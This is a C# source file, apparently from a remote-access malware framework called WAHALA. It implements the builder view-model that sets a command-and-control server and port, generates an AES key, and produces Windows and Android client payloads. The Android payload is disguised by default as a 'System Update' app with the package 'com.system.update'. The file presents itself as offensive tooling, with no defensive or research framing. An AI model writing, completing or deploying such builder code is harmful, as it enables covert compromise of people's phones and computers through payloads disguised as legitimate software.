using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows;
using System.Windows.Input;
using WAHALA.Server.Core;

namespace WAHALA.Server.ViewModels
{
    public class BuilderViewModel : INotifyPropertyChanged
    {
        private string _c2Server = "127.0.0.1";
        private int _c2Port = 4444;
        private string _aesKeyBase64;
        private string _appName = "System Update";
        private string _packageName = "com.system.update";
        private string _statusMessage;

        public string C2Server { get => _c2Server; set { _c2Server = value; OnPropertyChanged(); } }
        public int C2Port { get => _c2Port; set { _c2Port = value; OnPropertyChanged(); } }
        public string AppName { get => _appName; set { _appName = value; OnPropertyChanged(); } }
        public string PackageName { get => _packageName; set { _packageName = value; OnPropertyChanged(); } }
        public string AesKeyBase64 { get => _aesKeyBase64; set { _aesKeyBase64 = value; OnPropertyChanged(); } }
        public string StatusMessage { get => _statusMessage; set { _statusMessage = value; OnPropertyChanged(); } }

        public ICommand GenerateKeyCommand { get; }
        public ICommand BuildWindowsCommand { get; }
        public ICommand BuildAndroidCommand { get; }

        public BuilderViewModel()
        {
            AesKeyBase64 = GenerateKey();
            GenerateKeyCommand = new RelayCommand(_ => AesKeyBase64 = GenerateKey());
            BuildWindowsCommand = new RelayCommand(_ => BuildWindows());
            BuildAndroidCommand = new RelayCommand(_ => BuildAndroid());
        }

        private string GenerateKey()
        {
            using var aes = Aes.Create();
            aes.KeySize = 256;
            aes.GenerateKey();
            return Convert.ToBase64String(aes.Key);
        }

        private void BuildWindows()
        {
            try
            {
                StatusMessage = "Building Windows client...";
                string output = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "WAHALA_Client.exe");
                WindowsBuilder.Build(output, C2Server, C2Port, AesKeyBase64);
                StatusMessage = $"Windows client built: {output}";
            }
            catch (Exception ex)
            {
                StatusMessage = $"Error: {ex.Message}";
            }
        }

        private void BuildAndroid()
        {
            try
            {
                StatusMessage = "Building Android APK...";
                string output = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "WAHALA_Client.apk");
                string c2Url = $"ws://{C2Server}:{C2Port}";
                AndroidBuilder.Build(output, c2Url, AesKeyBase64, AppName, PackageName);
                StatusMessage = $"Android APK built: {output}";
            }
            catch (Exception ex)
            {
                StatusMessage = $"Error: {ex.Message}";
            }
        }

        public event PropertyChangedEventHandler? PropertyChanged;
        protected void OnPropertyChanged([CallerMemberName] string? name = null)
            => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(name));
    }

    public class RelayCommand : ICommand
    {
        private readonly Action<object?> _execute;
        private readonly Predicate<object?>? _canExecute;
        public RelayCommand(Action<object?> execute, Predicate<object?>? canExecute = null)
        {
            _execute = execute;
            _canExecute = canExecute;
        }
        public bool CanExecute(object? parameter) => _canExecute?.Invoke(parameter) ?? true;
        public void Execute(object? parameter) => _execute(parameter);
        public event EventHandler? CanExecuteChanged;
    }
}
